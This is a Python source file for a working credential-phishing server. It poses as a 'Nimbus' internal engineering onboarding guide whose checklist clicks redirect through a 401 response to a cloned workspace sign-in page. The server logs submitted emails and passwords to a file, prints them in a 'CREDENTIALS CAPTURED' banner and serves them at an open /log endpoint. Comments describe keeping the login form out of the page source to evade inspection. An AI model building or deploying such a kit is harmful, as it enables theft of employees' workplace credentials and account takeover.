#!/usr/bin/env python3
"""
Nimbus v5 — Auth-Gated Checklist
Checklist toggle → 401 (no session) → redirect to /auth/login → capture → redirect back.
Clean doc page. No auth in HTML source. Login page only reached via JS redirect.

python3 server.py [port]  (default 7778)
"""

import json, sys, os, random
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, quote

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []
SESSIONS = set()

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" fill="#6366f1" opacity=".15"/><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" stroke="#6366f1" stroke-width="1.2" fill="none"/></svg>'

CSS_DOC = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f9fafb;color:#1a1a2e;-webkit-font-smoothing:antialiased;line-height:1.6}
a{color:#6366f1;text-decoration:none}a:hover{text-decoration:underline}
nav{background:#1e1e2e;height:48px;display:flex;align-items:center;justify-content:center;
  position:sticky;top:0;z-index:50;padding:0 20px}
.ni{width:100%;max-width:820px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#fff;display:flex;align-items:center;gap:7px}
.nr{font-size:11px;color:#94a3b8}
.crumbs{max-width:820px;margin:0 auto;padding:10px 20px;font-size:11px;color:#94a3b8}
.crumbs span{color:#cbd5e1;margin:0 3px}
.w{max-width:820px;margin:0 auto;padding:0 20px 60px}
.doc{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:28px;
  box-shadow:0 1px 2px rgba(0,0,0,.03)}
@media(max-width:640px){.doc{padding:20px 16px}}
.doc h1{font-size:22px;font-weight:700;letter-spacing:-.3px;margin-bottom:4px;color:#0f172a}
.doc .meta{font-size:12px;color:#94a3b8;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid #f1f5f9}
.doc h2{font-size:16px;font-weight:600;color:#1e293b;margin:18px 0 8px;padding-top:12px;border-top:1px solid #f1f5f9}
.doc h2:first-of-type{border-top:none;padding-top:0}
.doc h3{font-size:14px;font-weight:600;color:#334155;margin:10px 0 5px}
.doc p{font-size:14px;color:#475569;margin-bottom:8px}
.doc ul,.doc ol{margin:0 0 8px 18px;font-size:14px;color:#475569}
.doc li{margin-bottom:2px}
.badges{display:flex;flex-wrap:wrap;gap:5px;margin:6px 0 10px}
.badge{padding:3px 9px;background:#f1f5f9;border-radius:5px;font-size:12px;color:#334155;font-weight:500}
.cw{margin:8px 0 10px;border-radius:7px;overflow:hidden}
.cbar{display:flex;align-items:center;justify-content:space-between;padding:4px 10px;background:#1e293b;font-size:10px;color:#94a3b8}
.cpb{background:#334155;color:#e2e8f0;border:none;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer}
pre{background:#0f172a;color:#e2e8f0;padding:12px;font-size:12px;line-height:1.5;overflow-x:auto;font-family:'SF Mono',Menlo,monospace;margin:0}
code{font-family:'SF Mono',Menlo,monospace;font-size:12px}
p code,li code{background:#f1f5f9;padding:1px 5px;border-radius:3px;color:#6366f1}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0}
@media(max-width:640px){.grid2{grid-template-columns:1fr}}
.tbl{width:100%;border-collapse:collapse;font-size:12px}
.tbl th{text-align:left;padding:5px 8px;background:#f8fafc;border:1px solid #e2e8f0;font-weight:600;color:#334155;font-size:10px;text-transform:uppercase;letter-spacing:.3px}
.tbl td{padding:5px 8px;border:1px solid #e2e8f0;color:#475569}
.chk{list-style:none;margin:0;padding:0}
.chk li{display:flex;align-items:center;gap:7px;padding:5px 0;font-size:13px;color:#475569;border-bottom:1px solid #f8fafc;cursor:pointer}
.chk li:last-child{border-bottom:none}
.ck{width:16px;height:16px;border:1.5px solid #cbd5e1;border-radius:3px;flex-shrink:0;display:flex;
  align-items:center;justify-content:center;transition:all .15s}
.ck.done{background:#6366f1;border-color:#6366f1}
.ck.done::after{content:'\\2713';color:#fff;font-size:10px;font-weight:700}
.contacts{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0}
.ct{display:flex;align-items:center;gap:7px;padding:7px 10px;background:#f8fafc;border-radius:7px;border:1px solid #f1f5f9;flex:1;min-width:170px}
.ct-av{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:600;color:#fff;flex-shrink:0}
.ct-n{font-size:12px;font-weight:600;color:#1e293b}.ct-r{font-size:10px;color:#94a3b8}
.col-btn{display:flex;align-items:center;gap:5px;background:none;border:none;font-size:14px;font-weight:600;color:#1e293b;cursor:pointer;padding:6px 0;font-family:inherit;width:100%;text-align:left}
.col-btn svg{transition:transform .2s;flex-shrink:0}
.col-btn.open svg{transform:rotate(90deg)}
.col-c{display:none;padding:2px 0 6px 18px;font-size:13px;color:#475569}.col-c.show{display:block}
.chk-note{font-size:11px;color:#94a3b8;margin-top:6px}
footer{text-align:center;padding:20px;font-size:11px;color:#cbd5e1}
"""

PAGE_DOC = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Engineering Onboarding Guide — Nimbus</title>
<style>""" + CSS_DOC + """</style></head><body>
<nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nr">Docs</span></div></nav>
<div class="crumbs">Docs <span>&#8250;</span> Engineering <span>&#8250;</span> Onboarding Guide</div>
<div class="w"><article class="doc">
  <h1>Engineering Onboarding Guide</h1>
  <p class="meta">Updated Jun 28, 2026 &middot; Engineering &middot; 8 min</p>
  <p>Welcome to the engineering team. Work through each section — your onboarding buddy can help.</p>

  <h2>Development Environment</h2>
  <h3>Prerequisites</h3>
  <div class="badges"><span class="badge">Node.js 20+</span><span class="badge">Docker Desktop 4.x</span><span class="badge">Git 2.40+</span><span class="badge">VS Code</span></div>
  <h3>Quick Start</h3>
  <div class="cw"><div class="cbar"><span>bash</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>git clone https://github.com/nimbus-eng/platform.git
cd platform && npm install
cp .env.example .env.local && npm run dev</code></pre></div>
  <p>Dev server on <code>localhost:3000</code> with hot reload.</p>

  <div class="grid2">
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">Architecture</h2>
      <table class="tbl"><thead><tr><th>Service</th><th>Port</th><th>Team</th></tr></thead><tbody>
        <tr><td>API Gateway</td><td>3000</td><td>Platform</td></tr>
        <tr><td>Auth</td><td>3001</td><td>Security</td></tr>
        <tr><td>Doc Engine</td><td>3002</td><td>Content</td></tr>
        <tr><td>Search</td><td>3003</td><td>Platform</td></tr>
        <tr><td>Notifications</td><td>3004</td><td>Platform</td></tr>
      </tbody></table>
    </div>
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">First Week Checklist</h2>
      <ul class="chk" id="checklist">
        <li onclick="tCk(this)"><span class="ck"></span>Set up dev environment</li>
        <li onclick="tCk(this)"><span class="ck"></span>Get GitHub org access</li>
        <li onclick="tCk(this)"><span class="ck"></span>Join Slack channels</li>
        <li onclick="tCk(this)"><span class="ck"></span>Security training</li>
        <li onclick="tCk(this)"><span class="ck"></span>1:1 with manager</li>
        <li onclick="tCk(this)"><span class="ck"></span>Meet onboarding buddy</li>
        <li onclick="tCk(this)"><span class="ck"></span>First commit</li>
      </ul>
      <p class="chk-note">Sign in to save progress across your team</p>
    </div>
  </div>

  <h2>Key Workflows</h2>
  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Pull Request Process</button>
  <div class="col-c"><ol><li>Feature branch from <code>main</code></li><li>Conventional commits</li><li>PR — CI runs lint/test/build</li><li>Code-owner approval</li><li>Squash merge</li></ol></div>
  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Incident Response</button>
  <div class="col-c"><ol><li>Post in <code>#incidents</code></li><li>Check Grafana</li><li>P0: page on-call via PagerDuty</li><li>Post-mortem within 48h</li></ol></div>

  <h2>Contacts</h2>
  <div class="contacts">
    <div class="ct"><div class="ct-av" style="background:#6366f1">SC</div><div><div class="ct-n">Sarah Chen</div><div class="ct-r">Eng Lead</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#059669">MR</div><div><div class="ct-n">Marcus Rivera</div><div class="ct-r">Platform</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#d97706">AK</div><div><div class="ct-n">Alex Kim</div><div class="ct-r">DevOps</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#dc2626">PS</div><div><div class="ct-n">Priya Sharma</div><div class="ct-r">Security</div></div></div>
  </div>
</article></div>
<footer>&copy; 2026 Nimbus &middot; Internal Documentation</footer>
<script>
function cpC(b){var c=b.closest('.cw').querySelector('code').textContent;
  navigator.clipboard.writeText(c).then(function(){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy';},1200);});}
function tCol(b){b.classList.toggle('open');b.nextElementSibling.classList.toggle('show');}

// Checklist: requires session to persist
function tCk(li){
  var ck=li.querySelector('.ck');
  // If already signed in (cookie present), toggle locally
  if(document.cookie.indexOf('nimbus_session')!==-1){
    ck.classList.toggle('done');
    // Sync to server
    fetch('/api/checklist/save',{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({item:li.textContent.trim(),done:ck.classList.contains('done')})
    });
    return;
  }
  // Not signed in — persist requires auth
  fetch('/api/checklist/save',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({item:li.textContent.trim()})
  }).then(function(r){
    if(r.status===401) window.location='/auth/login?redirect='+encodeURIComponent(window.location.pathname);
    else ck.classList.toggle('done');
  });
}
</script>
</body></html>"""

# ── Login page — reached only via JS redirect after 401 ───────────
CSS_LOGIN = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f4f4f5;color:#1a1a2e;-webkit-font-smoothing:antialiased;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
.lc{background:#fff;width:100%;max-width:380px;border-radius:14px;padding:32px;text-align:center;
  box-shadow:0 2px 12px rgba(0,0,0,.06)}
.l-logo{margin-bottom:16px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:20px;font-weight:700;color:#1e1e2e}
.lt{font-size:18px;font-weight:600;color:#0f172a;margin-bottom:4px}
.ls{font-size:13px;color:#64748b;margin-bottom:22px;line-height:1.5}
.lf{margin-bottom:12px;text-align:left}
.lf label{display:block;font-size:12px;color:#64748b;margin-bottom:4px;font-weight:500}
.lf input{width:100%;padding:10px 14px;border:1.5px solid #e2e8f0;border-radius:8px;
  font-size:15px;color:#1e293b;font-family:inherit;transition:border-color .15s}
.lf input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,.1)}
.lf input::placeholder{color:#cbd5e1}
.lb{width:100%;padding:11px;background:#6366f1;color:#fff;border:none;border-radius:8px;
  font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .15s;margin-top:4px}
.lb:hover{background:#4f46e5}
.ll{font-size:13px;color:#6366f1;text-decoration:none;display:block;margin-top:12px}
.ll:hover{text-decoration:underline}
.lftr{font-size:11px;color:#94a3b8;margin-top:20px;line-height:1.6}
"""

def login_page(redirect_uri):
    return """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in — Nimbus</title>
<style>""" + CSS_LOGIN + """</style></head><body>
<div class="lc">
  <div class="l-logo">""" + LOGO + """Nimbus</div>
  <p class="lt">Sign in to Nimbus</p>
  <p class="ls">Sign in to save your onboarding progress and sync it with your team.</p>
  <form method="POST" action="/auth/login">
    <input type="hidden" name="redirect" value=\"""" + redirect_uri + """\">
    <div class="lf"><label for="em">Workspace email</label>
      <input type="email" id="em" name="email" placeholder="you@company.com" autocomplete="username" required></div>
    <div class="lf"><label for="pw">Password</label>
      <input type="password" id="pw" name="password" placeholder="Your password" autocomplete="current-password" required></div>
    <button type="submit" class="lb">Sign in</button>
  </form>
  <a class="ll" href="#">Forgot password?</a>
  <p class="lftr">Nimbus Workspace &middot; Internal Documentation</p>
</div>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _ck(self):
        c = self.headers.get('Cookie','')
        for part in c.split(';'):
            k,_,v = part.strip().partition('=')
            if k == 'nimbus_session' and v in SESSIONS:
                return True
        return False
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        print(f'  [{m}] {self.path} | {self._ip()}')

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        qs = parse_qs(urlparse(self.path).query)

        if p in ('/docs/onboarding','/','/docs',''):
            self._log('PAGE')
            self._html(PAGE_DOC)
        elif p == '/auth/login':
            self._log('LOGIN-PAGE')
            redir = qs.get('redirect',['/docs/onboarding'])[0]
            self._html(login_page(redir))
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/clear':
            HITS.clear()
            open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET')
            self._html(PAGE_DOC)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/api/checklist/save':
            if self._ck():
                self._log('CHECKLIST-SAVE')
                self._send(200,'application/json','{"saved":true}')
            else:
                self._log('CHECKLIST-401')
                self._send(401,'application/json','{"error":"sign_in_required","message":"Sign in to save your checklist progress."}')

        elif p == '/auth/login':
            params = parse_qs(body)
            em = params.get('email',[''])[0]
            pw = params.get('password',[''])[0]
            redir = params.get('redirect',['/docs/onboarding'])[0]

            sess = 'sess_' + os.urandom(8).hex()
            SESSIONS.add(sess)
            self._log('CAPTURED', {'email':em,'password':pw})
            print(f"""
  ╔═══════════════════════════════════════╗
  ║   WORKSPACE CREDENTIALS CAPTURED      ║
  ╠═══════════════════════════════════════╣
  ║  Email:    {em:<28}║
  ║  Password: {pw:<28}║
  ║  IP:       {self._ip():<28}║
  ║  Time:     {datetime.now().strftime('%H:%M:%S'):<28}║
  ╚═══════════════════════════════════════╝
""")
            self.send_response(302)
            self.send_header('Location', redir)
            self.send_header('Set-Cookie', f'nimbus_session={sess}; Path=/; HttpOnly; SameSite=Lax')
            self.send_header('Cache-Control','no-store')
            self.end_headers()
        else:
            self._send(404,'text/plain','Not found')

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store')
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌──────────────────────────────────────────────┐
  │  Nimbus v5 — Auth-Gated Checklist             │
  │  http://0.0.0.0:{PORT:<29}│
  ├──────────────────────────────────────────────┤
  │  /docs/onboarding     Doc page (clean)        │
  │  /api/checklist/save  401 if no session        │
  │  /auth/login          Login page (capture)     │
  │  /log  /clear         Admin                    │
  └──────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
